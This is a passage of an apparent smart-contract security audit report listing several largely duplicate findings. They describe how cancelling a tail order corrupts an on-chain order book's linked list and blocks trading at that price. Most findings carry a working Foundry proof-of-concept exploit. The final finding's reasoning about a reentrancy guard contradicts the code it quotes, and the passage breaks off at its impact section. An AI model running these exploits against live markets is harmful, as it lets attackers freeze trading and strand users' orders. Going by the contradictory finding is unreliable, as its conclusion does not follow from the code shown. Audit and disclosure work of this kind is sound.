            MarketSettings({status: true, maxLimitsPerTx: 100, minLimitOrderAmountInBase: AMOUNT, tickSize: 1, lotSizeInBase: 1}),
            address(this)
        );
        clob = ICLOB(address(new BeaconProxy(address(beacon), initData)));
    }

    function _postAsk(address account) internal returns (uint256 orderId) {
        vm.prank(account);
        clob.postLimitOrder(account, ICLOB.PostLimitOrderArgs({
            amountInBase: AMOUNT,
            price: PRICE,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        }));
        orderId = clob.getNextOrderId() - 1;
    }

    function test_cancelingTailOrderBricksBestAsk() public {
        uint256 victimOrderId = _postAsk(victim);
        uint256 attackerOrderId = _postAsk(attacker);

        vm.prank(attacker);
        uint256[] memory ids = new uint256[](1);
        ids[0] = attackerOrderId;
        clob.cancel(attacker, ICLOB.CancelArgs({orderIds: ids}));

        Limit memory level = clob.getLimit(PRICE, Side.SELL);
        assertEq(level.numOrders, 1);
        assertEq(OrderIdLib.unwrap(level.headOrder), 0);
        assertEq(clob.getOrder(victimOrderId).owner, victim);

        vm.prank(buyer);
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postFillOrder(buyer, ICLOB.PostFillOrderArgs({
            amount: AMOUNT,
            priceLimit: PRICE,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        }));
    }
}


## Suggested Mitigation
Persist the new order's prevOrderId before or when storing it. For example, in _updateLimitPostOrder(), write self.orders[order.id].prevOrderId = tailOrder.id after linking tailOrder.nextOrderId, or set order.prevOrderId before self.orders[order.id] = order. Add invariant tests for canceling head, middle, and tail orders at the same price level.
```

### M-39 / `153JZItTsyyl20QBa0ugC`
- Finding title: Canceling a tail order corrupts CLOB price-level links and DoS'es all crossing orders at that price
- Report lines: 3683-3837
```md
## [M-39]. Canceling a tail order corrupts CLOB price-level links and DoS'es all crossing orders at that price

## id: 153JZItTsyyl20QBa0ugC

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
BookLib/CLOB._updateLimitPostOrder / cancel

## Finding Status: Valid
### Finding Status Justification: The finding's root cause is directly shown in BookLib: the order is stored before prevOrderId is set. For appended same-price orders, the stored predecessor remains zero. Cancelling the appended tail then makes _updateLimitRemoveOrder set headOrder and tailOrder to zero while leaving a positive numOrders and the tree entry. The CLOB matching loop then reads the null head and exits with zero fill, causing ZeroCostTrade in fill order processing. No authorization beyond owning the attacker's order is needed.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a second or later order is appended to an existing price level, its prevOrderId is written only to the memory copy after the order has already been stored. Vulnerable snippet: `self.orders[order.id] = order; ... Order storage tailOrder = self.orders[limit.tailOrder]; tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;`. Because `order.prevOrderId` is not persisted to `self.orders[order.id]`, canceling the appended tail makes `_updateLimitRemoveOrder` treat it as both head and tail. The limit keeps a positive `numOrders` and remains in the price tree, but `headOrder` and `tailOrder` become zero. Matching then reads `orders[0]`, computes a zero-sized match, breaks, and the public order flow reverts with `ZeroCostTrade`. An attacker can post behind an existing maker at the best price, cancel only the attacker's own tail order, recover their funds, and leave the victim maker's order stranded while the best price level blocks all crossing taker orders until the victim manually cancels.

## Impact
A permissionless trader can freeze one side of a market at the best bid or ask with no lasting capital lock after canceling their own order. All crossing fills and crossing limit orders that should trade through that best price revert, and the pre-existing maker order becomes unmatchable until its owner cancels it.

## Proof of Concept
1. A normal maker posts an ask at the current best ask price.
2. The attacker posts a second ask at the same price, becoming the tail of that price level.
3. The attacker cancels only their own tail order and receives their refund.
4. Because the tail order's prevOrderId was never stored, the limit's headOrder and tailOrder are set to zero while numOrders remains nonzero and the price remains in the ask tree.
5. A buyer submits a fill order crossing that ask. CLOB reads the null order at orders[0], produces a zero match, and reverts with ZeroCostTrade, blocking all buys through that price.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB, MarketConfig, MarketSettings, Limit} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side, OrderIdLib} from "contracts/clob/types/Order.sol";
import {AccountManager} from "contracts/account-manager/AccountManager.sol";

contract DummyFactory {
    function getMaxLimitExempt(address) external pure returns (bool) { return false; }
}

contract T {
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CLOBLinkedListPoC is Test {
    using OrderIdLib for *;

    uint256 constant PRICE = 1 ether;
    AccountManager accountManager;
    CLOB clob;
    T base;
    T quote;
    address maker = address(0xA11CE);
    address attacker = address(0xB0B);
    address taker = address(0xCAFE);

    function setUp() public {
        uint16[] memory fees = new uint16[](3);
        accountManager = new AccountManager(address(0xBEEF), address(this), fees, fees);
        accountManager.initialize(address(this));
        base = new T();
        quote = new T();
        clob = new CLOB(address(new DummyFactory()), address(0xBEEF), address(accountManager), 1000);
        clob.initialize(
            MarketConfig({quoteToken: address(quote), baseToken: address(base), quoteSize: 1 ether, baseSize: 1 ether}),
            MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: PRICE, lotSizeInBase: 1}),
            address(this)
        );
        accountManager.registerMarket(address(clob));
        _deposit(maker, base, 10 ether);
        _deposit(attacker, base, 10 ether);
        _deposit(taker, quote, 10 ether);
    }

    function test_cancelingTailOrderCorruptsLimitAndBlocksFills() public {
        uint256 makerOrder = _postAsk(maker);
        uint256 attackerTailOrder = _postAsk(attacker);

        ICLOB.CancelArgs memory cancelArgs;
        cancelArgs.orderIds = new uint256[](1);
        cancelArgs.orderIds[0] = attackerTailOrder;
        vm.prank(attacker);
        clob.cancel(attacker, cancelArgs);

        Limit memory limit = clob.getLimit(PRICE, Side.SELL);
        assertEq(limit.numOrders, 1);
        assertEq(OrderIdLib.unwrap(limit.headOrder), 0);
        assertEq(OrderIdLib.unwrap(limit.tailOrder), 0);
        assertEq(clob.getOrder(makerOrder).owner, maker);

        (, uint256 bestAsk) = clob.getTOB();
        assertEq(bestAsk, PRICE);

        vm.prank(taker);
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postFillOrder(
            taker,
            ICLOB.PostFillOrderArgs({
                amount: 1 ether,
                priceLimit: PRICE,
                side: Side.BUY,
                amountIsBase: true,
                fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
            })
        );
    }

    function _postAsk(address who) internal returns (uint256 orderId) {
        vm.prank(who);
        ICLOB.PostLimitOrderResult memory r = clob.postLimitOrder(
            who,
            ICLOB.PostLimitOrderArgs({
                amountInBase: 1 ether,
                price: PRICE,
                cancelTimestamp: 0,
                side: Side.SELL,
                clientOrderId: 0,
                limitOrderType: ICLOB.LimitOrderType.POST_ONLY
            })
        );
        return r.orderId;
    }

    function _deposit(address user, T token, uint256 amount) internal {
        token.mint(user, amount);
        vm.startPrank(user);
        token.approve(address(accountManager), amount);
        accountManager.deposit(user, address(token), amount);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Persist the appended order's prevOrderId in storage after linking it, or set it before writing the order into `self.orders`. For example, in `_updateLimitPostOrder`, write `self.orders[order.id].prevOrderId = tailOrder.id` after `tailOrder.nextOrderId = order.id`, then add regression tests for canceling head, middle, and tail orders at the same price level.
```

### M-40 / `nqPYgqKnbPRtrs3G-Y_1c`
- Finding title: Canceling a same-price order corrupts CLOB limit pointers and DoSes fills at that price
- Report lines: 3838-3979
```md
## [M-40]. Canceling a same-price order corrupts CLOB limit pointers and DoSes fills at that price

## id: nqPYgqKnbPRtrs3G-Y_1c

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
CLOB.postLimitOrder / cancel

## Finding Status: Valid
### Finding Status Justification: This is the same storage-linking root cause in BookLib. _updateBookPostOrder stores the appended order before _updateLimitPostOrder sets prevOrderId, so storage retains prevOrderId == 0. On cancellation, _updateLimitRemoveOrder uses the zero prev and tail next pointer to set the nonempty limit's head and tail to zero. The remaining live order is still in storage and open interest, but matching starts from order id zero and fails to progress. No complete safeguard exists, and the path is reachable by permissionless post and cancel operations.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a new order is appended to an existing price limit, the order is first written to storage in _updateBookPostOrder(), then its prevOrderId is set only on the memory copy in _updateLimitPostOrder(). The stored appended order therefore has prevOrderId == 0. If that appended order is later cancelled, _updateLimitRemoveOrder() treats it as the head order and can set the limit head/tail to zero even though another order remains at that price. Vulnerable snippet: `self.orders[order.id] = order;` occurs before `order.prevOrderId = tailOrder.id;`, so the stored order never receives the previous pointer. Later, cancellation executes `else limit.headOrder = next;` and `else limit.tailOrder = prev;` using the zero prev pointer. A maker can place two tiny same-price orders and cancel the second, leaving an unfillable best bid/ask that causes matching to break with zero fill.

## Impact
A permissionless maker can cheaply strand the best bid or ask, causing taker fills crossing that price to revert until the stranded order is cancelled. This breaks market availability and price-time priority; other makers' orders at the same price can be made unfillable or skipped.

## Proof of Concept
1. A maker posts an ask at price P. 2. The attacker posts a second ask at the same price P, which is stored with prevOrderId = 0. 3. The attacker cancels the second ask. 4. The limit still has numOrders == 1, but headOrder and tailOrder are zero. 5. A taker submits a buy fill crossing P; matching reads the zero head order, fills nothing, and reverts with ZeroCostTrade while the original ask remains locked in the book.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB, ICLOB} from "contracts/clob/CLOB.sol";
import {MarketConfig, MarketSettings, Limit} from "contracts/clob/types/Book.sol";
import {Side, Order, OrderIdLib} from "contracts/clob/types/Order.sol";

contract FakeManager {
    function getMaxLimitExempt(address) external pure returns (bool) { return false; }
}

contract FakeAccountManager {
    mapping(address => mapping(address => uint256)) public bal;

    function setBalance(address account, address token, uint256 amount) external { bal[account][token] = amount; }
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }

    function settleIncomingOrder(ICLOB.SettleParams calldata p) external returns (uint256) {
        if (p.side == Side.BUY) {
            require(bal[p.taker][p.quoteToken] >= p.takerQuoteAmount, "quote");
            bal[p.taker][p.quoteToken] -= p.takerQuoteAmount;
            bal[p.taker][p.baseToken] += p.takerBaseAmount;
        } else {
            require(bal[p.taker][p.baseToken] >= p.takerBaseAmount, "base");
            bal[p.taker][p.baseToken] -= p.takerBaseAmount;
            bal[p.taker][p.quoteToken] += p.takerQuoteAmount;
        }
        for (uint256 i; i < p.makerCredits.length; ++i) {
            bal[p.makerCredits[i].maker][p.quoteToken] += p.makerCredits[i].quoteAmount;
            bal[p.makerCredits[i].maker][p.baseToken] += p.makerCredits[i].baseAmount;
        }
        return 0;
    }

    function creditAccount(address account, address token, uint256 amount) external { bal[account][token] += amount; }
    function creditAccountNoEvent(address account, address token, uint256 amount) external { bal[account][token] += amount; }
    function debitAccount(address account, address token, uint256 amount) external {
        require(bal[account][token] >= amount, "debit");
        bal[account][token] -= amount;
    }
}

contract CLOBPointerCorruptionPoC is Test {
    CLOB clob;
    FakeAccountManager am;
    address base = address(0xBEEF);
    address quote = address(0xCAFE);
    address maker = address(0xA11CE);
    address griefer = address(0xB0B);
    address taker = address(0xCA7);

    function setUp() public {
        am = new FakeAccountManager();
        clob = new CLOB(address(new FakeManager()), address(0), address(am), 1_000);
        clob.initialize(
            MarketConfig({quoteToken: quote, baseToken: base, quoteSize: 1e18, baseSize: 1e18}),
            MarketSettings({status: true, maxLimitsPerTx: 255, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}),
            address(this)
        );
        am.setBalance(maker, base, 1_000_000);
        am.setBalance(griefer, base, 1_000_000);
        am.setBalance(taker, quote, 1_000_000 ether);
    }

    function test_cancelingSecondOrderZerosLimitHeadAndBlocksFills() public {
        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
            amountInBase: 100,
            price: 1e18,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });

        vm.prank(maker);
        clob.postLimitOrder(maker, ask);
        vm.prank(griefer);
        clob.postLimitOrder(griefer, ask);

        uint256[] memory ids = new uint256[](1);
        ids[0] = 2;
        vm.prank(griefer);
        clob.cancel(griefer, ICLOB.CancelArgs({orderIds: ids}));

        Limit memory limit = clob.getLimit(1e18, Side.SELL);
        assertEq(limit.numOrders, 1);
        assertEq(OrderIdLib.unwrap(limit.headOrder), 0);
        assertEq(OrderIdLib.unwrap(limit.tailOrder), 0);

        ICLOB.PostFillOrderArgs memory buy = ICLOB.PostFillOrderArgs({
            amount: 100,
            priceLimit: 1e18,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        });

        vm.expectRevert();
        vm.prank(taker);
        clob.postFillOrder(taker, buy);

        Order memory stranded = clob.getOrder(1);
        assertEq(stranded.owner, maker);
        assertEq(stranded.amount, 100);
    }
}


## Suggested Mitigation
Persist the previous pointer before writing the new order to storage, or update the stored order after appending. For example, set `order.prevOrderId = limit.tailOrder` before `self.orders[order.id] = order`, then update the previous tail's next pointer and the limit tail. Add invariant tests that for every populated limit, head/tail are nonzero, linked-list traversal reaches exactly numOrders, and cancelling any head/middle/tail order preserves the list.
```

### M-41 / `_6-2VSOzJzLq5VgATL8RN`
- Finding title: Canceling an appended same-price order corrupts the CLOB queue and blocks matching at that price
- Report lines: 3980-4136
```md
## [M-41]. Canceling an appended same-price order corrupts the CLOB queue and blocks matching at that price

## id: _6-2VSOzJzLq5VgATL8RN

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
BookLib / CLOB._updateLimitPostOrder, _updateLimitRemoveOrder, postFillOrder

## Finding Status: Valid
### Finding Status Justification: The claimed queue corruption is directly present. BookLib writes the order to self.orders before setting the appended order prevOrderId in _updateLimitPostOrder, and that memory mutation is never persisted. Cancelling the appended tail then uses prevOrderId zero and nextOrderId zero, so _updateLimitRemoveOrder updates the limit as if the tail were both head and tail while leaving numOrders nonzero and the tree price active. The remaining order is stranded and matching loads the null order. No admin or privileged action is needed; the maker can cancel its own appended order.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a second or later order is appended to an existing price level, BookLib writes the order to storage before setting its prevOrderId in memory. The stored appended order therefore keeps prevOrderId == 0. If that appended order is later canceled, _updateLimitRemoveOrder treats it as the head of the queue and sets the limit head/tail to zero while limit.numOrders remains nonzero and the price stays in the tree.

Vulnerable snippet:
```solidity
function _updateBookPostOrder(Book storage self, Order memory order) private returns (Limit storage limit) {
    ...
    self.orders[order.id] = order;
}

function _updateLimitPostOrder(Book storage self, Limit storage limit, Order memory order) private {
    limit.numOrders++;
    if (limit.headOrder.isNull()) {
        limit.headOrder = order.id;
        limit.tailOrder = order.id;
    } else {
        Order storage tailOrder = self.orders[limit.tailOrder];
        tailOrder.nextOrderId = order.id;
        order.prevOrderId = tailOrder.id;
        limit.tailOrder = order.id;
    }
}
```

After corruption, CLOB._matchIncomingBid/_matchIncomingAsk reads ds.orders[limit.headOrder] where headOrder is zero. The null maker order has amount zero, so _matchIncomingOrder returns baseDelta == 0 and matching breaks. FOK fills then revert with ZeroCostTrade even though a real order remains stored at that best price, and worse-priced honest liquidity is unreachable until the attacker clears the stale level.

## Impact
A permissionless maker can cheaply brick matching on one side of a market by placing two minimum-size orders at the same best price and canceling the appended order. Crossing taker orders and router routes that need that CLOB side revert or cannot reach worse-priced liquidity, causing market-level availability loss without requiring privileged access.

## Proof of Concept
1. Attacker posts two ask orders at the same price, so the second order is appended to the existing limit.
2. Because the appended order was already written to storage before prevOrderId was set, the second stored order has prevOrderId == 0.
3. Attacker cancels the second order.
4. _updateLimitRemoveOrder treats the canceled second order as the head and sets limit.headOrder and limit.tailOrder to zero while limit.numOrders is still one and the ask price remains in the tree.
5. A taker submits a crossing bid. Matching loads order id zero, computes baseDelta == 0, breaks, and the fill reverts with ZeroCostTrade while the first ask order still exists.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {BeaconProxy} from "@openzeppelin/proxy/beacon/BeaconProxy.sol";
import {CLOB, MarketConfig, MarketSettings} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side, Order} from "contracts/clob/types/Order.sol";
import {Limit} from "contracts/clob/types/Book.sol";

contract MockBeacon {
    address public implementation;
    constructor(address impl) { implementation = impl; }
}

contract MockFactory {
    function getMaxLimitExempt(address) external pure returns (bool) { return false; }
}

contract MockAccountManager {
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
}

contract SamePriceQueueCorruptionPoC is Test {
    CLOB clob;
    address maker = address(0xA11CE);
    address taker = address(0xB0B);
    address base = address(0xBEEF);
    address quote = address(0xCAFE);

    function setUp() public {
        MockFactory factory = new MockFactory();
        MockAccountManager accountManager = new MockAccountManager();
        CLOB impl = new CLOB(address(factory), address(0x1234), address(accountManager), 1000);
        MockBeacon beacon = new MockBeacon(address(impl));

        bytes memory initData = abi.encodeWithSelector(
            CLOB.initialize.selector,
            MarketConfig({quoteToken: quote, baseToken: base, quoteSize: 1e18, baseSize: 1e18}),
            MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}),
            address(this)
        );
        clob = CLOB(address(new BeaconProxy(address(beacon), initData)));
    }

    function test_cancelingAppendedOrderBricksMatchingAtBestPrice() public {
        vm.startPrank(maker);
        uint256 firstOrderId = clob.getNextOrderId();
        clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({
            amountInBase: 100,
            price: 10,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        }));

        uint256 secondOrderId = clob.getNextOrderId();
        clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({
            amountInBase: 100,
            price: 10,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        }));

        uint256[] memory ids = new uint256[](1);
        ids[0] = secondOrderId;
        clob.cancel(maker, ICLOB.CancelArgs({orderIds: ids}));
        vm.stopPrank();

        Limit memory limit = clob.getLimit(10, Side.SELL);
        assertEq(limit.numOrders, 1);
        assertEq(uint256(limit.headOrder), 0);
        assertEq(uint256(limit.tailOrder), 0);

        Order memory stillResting = clob.getOrder(firstOrderId);
        assertEq(stillResting.owner, maker);
        assertEq(stillResting.amount, 100);

        vm.prank(taker);
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postFillOrder(taker, ICLOB.PostFillOrderArgs({
            amount: 100,
            priceLimit: 10,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.FILL_OR_KILL
        }));
    }
}

## Suggested Mitigation
Persist the appended order's prevOrderId before writing it to storage, or explicitly update self.orders[order.id].prevOrderId after setting it. Add invariant tests that every populated limit has nonzero head/tail, that forward traversal length equals numOrders, and that canceling any non-head order preserves queue links.
```

### M-43 / `MsApEnZhb8xJbreCI0cFX`
- Finding title: Authorized tick-size update lets zero-quote asks permanently block buy-side matching
- Report lines: 4258-4348
```md
## [M-43]. Authorized tick-size update lets zero-quote asks permanently block buy-side matching

## id: MsApEnZhb8xJbreCI0cFX

## Derived From Pattern/Invariant
PricePrecisionOrRoundingError

## Exploit Type
PricePrecision

## Location
CLOB.setTickSize

## Finding Status: Valid
### Finding Status Justification: The issue is triggered by an authorized tick-size update, but the manager can call the documented setTickSizes function with a value accepted by BookLib.setTickSize while violating the creation-time nonzero-quote invariant. Under the stated caveat, an admin using a valid settings function can accidentally brick matching, so classifying it only as governance risk is not fully valid.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
Market creation rejects settings where the minimum order at the minimum tick rounds to zero quote, but later tick-size updates do not preserve that invariant. Creation checks `settings.tickSize.fullMulDiv(settings.minLimitOrderAmountInBase, baseSize) == 0`, while `setTickSize` only checks `newTickSize < MIN_LIMIT_PRICE_IN_TICKS`. After an authorized manager sets a very small tick size, a permissionless seller can post a minimum-sized ask at price `1` where `getQuoteTokenAmount(price, amount)` floors to zero. The ask posts successfully because ask posting debits base, not quote. Any buy that crosses it computes `baseDelta > 0` and `quoteDelta == 0`; `_processFillBidOrder` then reverts with `ZeroCostTrade`, rolling back the removal. The zero-quote ask remains the best ask and blocks all buy-side fills until its owner cancels it.

## Impact
Medium functional impact after a routine privileged setting update: a tiny permissionless order can halt buy-side matching for the market, with no admin cancel path to remove the blocker.

## Proof of Concept
1. The manager lowers a market tick size to `1`, which `CLOB.setTickSize` accepts even though the original market-creation invariant would reject the resulting precision.
2. Attacker posts a sell limit order for `minLimitOrderAmountInBase` at price `1`.
3. The order locks a tiny amount of base but has zero quote value due to floor division in `getQuoteTokenAmount`.
4. A taker tries to buy through the book.
5. Matching hits the zero-quote ask first, then reverts `ZeroCostTrade`; the revert restores the blocker, so future buys fail the same way.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side} from "contracts/clob/types/Order.sol";

contract ZeroQuoteAskDoSPoC is CLOBTestBase {
    function testLoweredTickAllowsZeroQuoteAskToBrickBuys() public {
        ICLOB[] memory clobs = new ICLOB[](1);
        uint256[] memory ticks = new uint256[](1);
        clobs[0] = ICLOB(address(clob));
        ticks[0] = 1;
        clobManager.setTickSizes(clobs, ticks);

        address attacker = users[0];
        address liveMaker = users[1];
        address taker = users[2];
        uint256 dustAskAmount = MIN_LIMIT_ORDER_AMOUNT_IN_BASE;

        assertEq(clob.getQuoteTokenAmount(1, dustAskAmount), 0, "ask has zero quote value");

        setupTokens(Side.SELL, attacker, dustAskAmount, 1, true);
        ICLOB.PostLimitOrderArgs memory blocker = ICLOB.PostLimitOrderArgs({
            amountInBase: dustAskAmount,
            price: 1,
            cancelTimestamp: NEVER,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED
        });
        vm.prank(attacker);
        clob.postLimitOrder(attacker, blocker);

        setupOrder(Side.SELL, liveMaker, 1 ether, TICK_SIZE);
        setupTokens(Side.BUY, taker, 1 ether, TICK_SIZE, true);

        ICLOB.PostFillOrderArgs memory fill = ICLOB.PostFillOrderArgs({
            amount: 1 ether,
            priceLimit: TICK_SIZE,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        });

        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        vm.prank(taker);
        clob.postFillOrder(taker, fill);

        assertEq(clob.getOrder(1).owner, attacker, "zero-quote blocker remains after reverted fill");
    }
}

## Suggested Mitigation
Make all settings updates preserve the same invariant enforced at market creation. In `setTickSize` and `setMinLimitOrderAmountInBase`, require `newTickSize * minLimitOrderAmountInBase / baseSize > 0` using `fullMulDiv`, and consider rejecting or force-canceling existing orders whose stored price/amount now converts to zero quote.
```

### M-44 / `UQjLUNPmihJvNMUkkW81r`
- Finding title: Tail cancellation corrupts CLOB price-level links and lets a maker cheaply DoS matching
- Report lines: 4349-4428
```md
## [M-44]. Tail cancellation corrupts CLOB price-level links and lets a maker cheaply DoS matching

## id: UQjLUNPmihJvNMUkkW81r

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
BookLib/CLOB.addOrderToBook,removeOrderFromBook,cancel,postFillOrder

## Finding Status: Valid
### Finding Status Justification: BookLib.addOrderToBook calls _updateBookPostOrder first, which writes self.orders[order.id] = order while prevOrderId is still zero. _updateLimitPostOrder later assigns order.prevOrderId = tailOrder.id only on the memory copy, so the stored appended order keeps prevOrderId == 0. When that appended tail is removed, _updateLimitRemoveOrder treats prev and next as null and sets headOrder and tailOrder to zero while numOrders is decremented but remains nonzero. Matching then reads self.orders[limit.headOrder] as order zero and cannot reach live liquidity. No guard repairs or validates links, and posting/canceling same-price orders is permissionless.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib stores the new order before setting its prevOrderId, so appended orders keep prevOrderId == 0 in storage. Vulnerable snippet: `self.orders[order.id] = order;` is executed in `_updateBookPostOrder`, then `_updateLimitPostOrder` only mutates the memory copy with `order.prevOrderId = tailOrder.id`. When the appended tail is canceled, `_updateLimitRemoveOrder` sees both prev and next as null and sets a non-empty limit's headOrder and tailOrder to zero while leaving the older order live and the price in the tree. Matching then reads `ds.orders[limit.headOrder]` as order zero, gets baseDelta == 0, breaks, and reverts/does not reach real liquidity. A maker can do this with two minimum-size orders at the best bid or ask, cancel the second order, and keep the first order as a poisoned top-of-book level.

## Impact
A permissionless maker can cheaply block fills crossing the poisoned best bid/ask. Existing liquidity remains locked in open interest until its owner cancels, and takers cannot trade through the corrupted top price, causing market-level availability loss without needing to steal funds.

## Proof of Concept
1. Attacker posts two SELL limit orders at the same low ask price. 2. The second order is appended, but its storage prevOrderId remains zero. 3. Attacker cancels the second order. 4. The limit still has numOrders == 1 but headOrder == tailOrder == 0 while the first order remains live and the ask price remains in the tree. 5. A taker BUY crossing that ask reads order zero and reverts with ZeroCostTrade instead of matching.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {Side, OrderIdLib} from "contracts/clob/types/Order.sol";
import {Limit} from "contracts/clob/types/Book.sol";

contract CLOBLinkedListCorruptionPoC is CLOBTestBase {
    using OrderIdLib for *;

    function test_tailCancelCorruptsBestAskAndBlocksMatching() public {
        address attacker = users[0];
        address taker = users[1];
        uint256 price = TICK_SIZE;
        uint256 amount = MIN_LIMIT_ORDER_AMOUNT_IN_BASE;

        setupOrder(Side.SELL, attacker, amount, price); // order 1 remains live
        setupOrder(Side.SELL, attacker, amount, price); // order 2 is appended with prevOrderId == 0 in storage

        uint256[] memory ids = new uint256[](1);
        ids[0] = 2;
        vm.prank(attacker);
        clob.cancel(attacker, ICLOB.CancelArgs({orderIds: ids}));

        Limit memory limit = clob.getLimit(price, Side.SELL);
        assertEq(limit.numOrders, 1);
        assertEq(limit.headOrder.unwrap(), 0);
        assertEq(limit.tailOrder.unwrap(), 0);
        assertEq(clob.getOrder(1).owner, attacker);

        setupTokens(Side.BUY, taker, amount, price, true);
        ICLOB.PostFillOrderArgs memory fillArgs = ICLOB.PostFillOrderArgs({
            amount: amount,
            priceLimit: price,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL
        });

        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        vm.prank(taker);
        clob.postFillOrder(taker, fillArgs);
    }
}

## Suggested Mitigation
Persist the appended order's prevOrderId before storing it, or update the stored order after computing links. For example, in addOrderToBook set prev/next on the memory order first, then write `self.orders[order.id] = order`; add invariant tests that a non-empty limit always has nonzero head/tail and reciprocal prev/next links after cancel, match, amend, and non-competitive removal.
```

### M-45 / `ejeE9u68HPOend0p-7kCj`
- Finding title: Non-mainnet GTERouter guarded flows are bricked by default ReentrancyGuardTransient mode
- Report lines: 4429-4507
```md
## [M-45]. Non-mainnet GTERouter guarded flows are bricked by default ReentrancyGuardTransient mode

## id: ejeE9u68HPOend0p-7kCj

## Derived From Pattern/Invariant
GTERouter.executeRoute uses Solady ReentrancyGuardTransient in mainnet-only transient mode, which reverts on non-mainnet chain IDs from the default zero guard slot

## Exploit Type
Dos

## Location
GTERouter.executeRoute, launchpadBuy, launchpadSell

## Finding Status: Valid
### Finding Status Justification:
### Finding Complexity: 2
## Minimim Privilege Required:Permissionless


## Description
GTERouter inherits Solady ReentrancyGuardTransient but does not override _useTransientReentrancyGuardOnlyOnMainnet(). In Solady v0.0.287 the default returns true, so on block.chainid != 1 the guard uses an SSTORE compatibility branch. That branch treats a zero guard slot as already entered and reverts before the function body executes:

function _useTransientReentrancyGuardOnlyOnMainnet() internal view virtual returns (bool) {
    return true;
}

if (block.chainid == 1) { ... } else {
    assembly {
        if eq(sload(s), address()) {
            mstore(0x00, s)
            revert(0x1c, 0x04)
        }
        sstore(s, address())
    }
}

GTERouter applies nonReentrant to executeRoute, launchpadBuy, and launchpadSell. Because the router never initializes the guard slot and never overrides the mode to always use transient storage, every first guarded call on supported non-mainnet deployments reverts with Reentrancy. This is a present-state liveness bug in the in-scope router rather than an admin misuse issue: the contract is configured to support Cancun and uses transient storage, but its inherited default selects the broken compatibility branch on any chain ID other than 1.

## Impact
